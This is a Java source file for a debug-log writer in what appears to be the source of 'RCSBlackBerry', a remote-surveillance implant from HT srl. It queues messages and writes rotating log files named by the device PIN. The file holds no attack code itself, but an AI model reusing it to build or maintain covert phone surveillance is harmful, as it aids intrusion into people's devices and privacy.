//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.utils
 * File         : DebugWriter.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.debug;

import net.rim.device.api.system.RuntimeStore;
import blackberry.Device;
import blackberry.fs.AutoFlashFile;
import blackberry.fs.Path;
import blackberry.utils.Check;

/**
 * The Class DebugWriter.
 */
public final class DebugWriter extends Thread {

    static final String DEBUG_NAME = "D_";
    static final String ERROR_NAME = "E_";

    // static final String SD_PATH = Path.SD() + Path.DEBUG_DIR + FILE_NAME
    //         + Device.getPin() + ".txt";
    // static final String FLASH_PATH = Path.USER() + Path.DEBUG_DIR + FILE_NAME
    //         + Device.getPin() + ".txt";
    private static final long SLEEP_TIME = 1000;

    private static final int MAX_NUM_MESSAGES = 5000;

    private static AutoFlashFile fileDebug;
    private static AutoFlashFile fileDebugErrors;

    boolean haveMessages;

    boolean toStop;
    boolean logToSD = false;

    StringBuffer queueAll;
    StringBuffer queueErrors;

    int numMessages;

    /**
     * Instantiates a new debug writer.
     * 
     * @param logToSD
     *            the log to sd
     */
    private DebugWriter() {

        toStop = false;
        queueAll = new StringBuffer();
        queueErrors = new StringBuffer();

    }

    static DebugWriter instance;
    static final long GUID = 0xbc56afac435c4a92L;

    public static synchronized DebugWriter getInstance() {

        if (instance == null) {
            instance = (DebugWriter) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {

                final DebugWriter singleton = new DebugWriter();

                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }
        }

        return instance;
    }

    private void createNewFile() {

        if (logToSD) {
            Path.createDirectory(Path.SD());
            fileDebug = new AutoFlashFile(debugDir(Path.SD())
                    + debugName(DEBUG_NAME), true);

            fileDebugErrors = new AutoFlashFile(debugDir(Path.SD())
                    + debugName(ERROR_NAME), true);
        } else {
            Path.createDirectory(Path.USER());
            fileDebug = new AutoFlashFile(debugDir(Path.USER())
                    + debugName(DEBUG_NAME), true);
            fileDebugErrors = new AutoFlashFile(debugDir(Path.USER())
                    + debugName(ERROR_NAME), true);
        }

        // log rotate
        if (fileDebug.exists()) {
            fileDebug.rotateLogs("D_");
        }

        fileDebug.create();

        // crea il log degli errori solo se non esiste, non si ruota
        if (!fileDebugErrors.exists()) {
            fileDebugErrors.create();
        }

    }

    private String debugName(String debugName) {
        return debugName + Device.getPin() + ".txt";
    }

    private String debugDir(String baseDir) {
        return baseDir + Path.DEBUG_DIR;
    }

    /**
     * Append.
     * 
     * @param message
     *            the message
     * @param highPriority
     * @return true, if successful
     */
    public synchronized boolean append(final String message, boolean error) {

        if (numMessages > MAX_NUM_MESSAGES * 2) {
            return false;
        }

        queueAll.append(message + "\r\n");
        if (error) {
            queueErrors.append(message + "\r\n");
        }

        numMessages++;
        haveMessages = true;

        return true;
    }

    /*
     * (non-Javadoc)
     * @see java.lang.Thread#run()
     */
    public void run() {
        //#ifdef DEBUG
        createNewFile();
        //#endif

        //#ifdef DBC
        Check.asserts(fileDebug != null, "null filedebug");
        Check.asserts(fileDebugErrors != null, "null filedebugerrors");
        //#endif

        for (;;) {
            synchronized (this) {

                if (haveMessages) {
                    // scoda tutti i messaggi
                    String message = queueAll.toString();
                    if (message.length() > 0) {
                        if (!fileDebug.exists()) {
                            fileDebug.create();
                        }
                        boolean ret = fileDebug.append(message + "\r\n");
                        queueAll = new StringBuffer();
                    }

                    // scoda solo gli errori
                    message = queueErrors.toString();
                    if (message.length() > 0) {
                        if (!fileDebugErrors.exists()) {
                            fileDebugErrors.create();
                        }
                        boolean ret = fileDebugErrors.append(message + "\r\n");
                        queueErrors = new StringBuffer();
                    }

                    haveMessages = false;

                    if (numMessages > MAX_NUM_MESSAGES) {
                        numMessages = 0;
                        fileDebug.rotateLogs("D_");
                        createNewFile();
                    }
                }

                if (toStop) {
                    break;
                }

                try {
                    wait(SLEEP_TIME);
                } catch (final InterruptedException e) {
                }
            }
            //Utils.sleep((int) SLEEP_TIME);
        }
    }

    /**
     * Stop.
     */
    public synchronized void requestStop() {
        toStop = true;
        notifyAll();
    }

}
